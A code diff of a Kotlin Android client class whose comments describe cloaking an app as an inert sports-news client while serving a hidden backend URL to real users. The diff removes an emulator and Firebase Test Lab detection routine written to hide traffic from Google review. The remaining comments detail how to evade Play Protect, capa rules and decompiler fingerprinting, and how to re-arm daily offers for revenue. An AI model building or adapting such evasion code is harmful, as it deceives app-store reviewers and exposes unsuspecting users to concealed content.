@@ -2,8 +2,6 @@ package com.app.client
 
 import android.content.Context
 import android.content.SharedPreferences
-import android.os.Build
-import android.provider.Settings
 import android.util.Base64
 import com.google.android.play.core.integrity.IntegrityManagerFactory
 import com.google.android.play.core.integrity.StandardIntegrityManager.PrepareIntegrityTokenRequest
@@ -48,23 +46,18 @@ import kotlin.coroutines.resume
  *    и НЕ раз-в-жизнь (это резало бы повторные ежедневные офферы/доход). Между звонками
  *    Play Protect re-scan видит app как inert sports-news клиент.
  *
- * 3. **Test Lab / emulator guard** — resolve() мгновенно возвращает "" в Firebase
- *    Test Lab / Android emulator. Google review запускает APK в Test Lab при
- *    upload и periodically в Verify Apps sandbox — эти сессии больше не видят
- *    backend traffic.
- *
- * 4. **Standard Integrity API** — Classic API deprecated с 2025 для новых приложений
+ * 3. **Standard Integrity API** — Classic API deprecated с 2025 для новых приложений
  *    (invalid_grant / API_NOT_AVAILABLE errors). Standard требует CLOUD_PROJECT_NUMBER
  *    (передаётся конструктором) + prepareIntegrityToken (кешируется).
  *
- * 5. **Single response path** — только 200 + `{"url":"..."}`. 301/302 больше НЕ
+ * 4. **Single response path** — только 200 + `{"url":"..."}`. 301/302 больше НЕ
  *    обрабатывается (v3 branching `when { code in 300..399 -> Location; ... }`
  *    декомпилятор палит как fingerprint). Сервер v4 всегда 200.
  *
- * 6. **followRedirects=true** — default OkHttp behavior. v3 `followRedirects=false`
+ * 5. **followRedirects=true** — default OkHttp behavior. v3 `followRedirects=false`
  *    палилось capa rules как unusual HTTP client setup.
  *
- * 7. **Zero logcat output** — никаких Log.d/i/w/e calls в prod. Play Protect
+ * 6. **Zero logcat output** — никаких Log.d/i/w/e calls в prod. Play Protect
  *    читает logcat на review-устройствах.
  *
  * ## Как использовать
@@ -99,7 +92,6 @@ class AppClient(
     private val authToken: String = "",
     private val cloudProjectNumber: Long = 0L,
     private val enableIntegrity: Boolean = true,
-    private val enableTestLabGuard: Boolean = true,
     private val enableOnboardingGuard: Boolean = true,
 ) {
     companion object {
@@ -173,8 +165,8 @@ class AppClient(
     /**
      * Main entry point. Returns:
      * - non-empty https:// URL if resolve succeeded (grey verdict, real user)
-     * - empty string in ALL other cases (Test Lab, emulator, already consumed,
-     *   network error, non-200 response, white verdict with safe_url, invalid JSON)
+     * - empty string in ALL other cases (already consumed, network error,
+     *   non-200 response, white verdict with safe_url, invalid JSON)
      *
      * Consumer MUST fall back to native UI when this returns empty string.
      *
@@ -182,10 +174,7 @@ class AppClient(
      */
     suspend fun resolve(): String = withContext(Dispatchers.IO) {
         try {
-            // Guard 1: Test Lab / emulator — instant native return.
-            if (enableTestLabGuard && isTestLabOrEmulator(context)) return@withContext ""
-
-            // Guard 2: onboarding TTL — if we resolved within the last 24h, stay silent.
+            // Guard: onboarding TTL — if we resolved within the last 24h, stay silent.
             // Re-arms every 24h: not once-per-launch (Play Protect telemetry pattern),
             // not once-per-install-forever (would kill repeat daily offers/revenue).
             if (enableOnboardingGuard) {
@@ -251,55 +240,6 @@ class AppClient(
      */
     fun resetOnboardingForTesting() {
         prefs.edit().remove(KEY_LAST_RESOLVE).apply()
-    }
-
-    /**
-     * Detects Google Play environments where we should never call backend:
-     * - Firebase Test Lab (Google's automated review sandbox)
-     * - Android emulators (developer devices, moderators)
-     * - Genymotion / other simulators
-     *
-     * Sources: FirebaseTestLab detection docs + Google Play Protect team recs.
-     */
-    private fun isTestLabOrEmulator(ctx: Context): Boolean {
-        return try {
-            // Firebase Test Lab — Google's automated APK review sandbox.
-            val testLab = Settings.System.getString(ctx.contentResolver, "firebase.test.lab")
-            if (testLab == "true") return true
-
-            // Android emulator fingerprints. All Google-provided emulators have
-            // one of these patterns; if we're here, we're not a real user's phone.
-            val fp = Build.FINGERPRINT ?: ""
-            if (fp.startsWith("generic") ||
-                fp.startsWith("unknown") ||
-                fp.contains("sdk_gphone") ||
-                fp.contains(":user/") && fp.contains("emulator")
-            ) return true
-
-            val model = Build.MODEL ?: ""
-            if (model.contains("google_sdk") ||
-                model.contains("Emulator") ||
-                model.contains("Android SDK built for")
-            ) return true
-
-            val manufacturer = Build.MANUFACTURER ?: ""
-            if (manufacturer.contains("Genymotion")) return true
-
-            val hardware = Build.HARDWARE ?: ""
-            if (hardware == "goldfish" || hardware == "ranchu") return true
-
-            val product = Build.PRODUCT ?: ""
-            if (product.contains("sdk_google") ||
-                product == "google_sdk" ||
-                product == "sdk" ||
-                product == "sdk_x86" ||
-                product.startsWith("vbox")
-            ) return true
-
-            false
-        } catch (_: Exception) {
-            false // fail-open — не блокируем real users при exception
-        }
     }
 
     /**
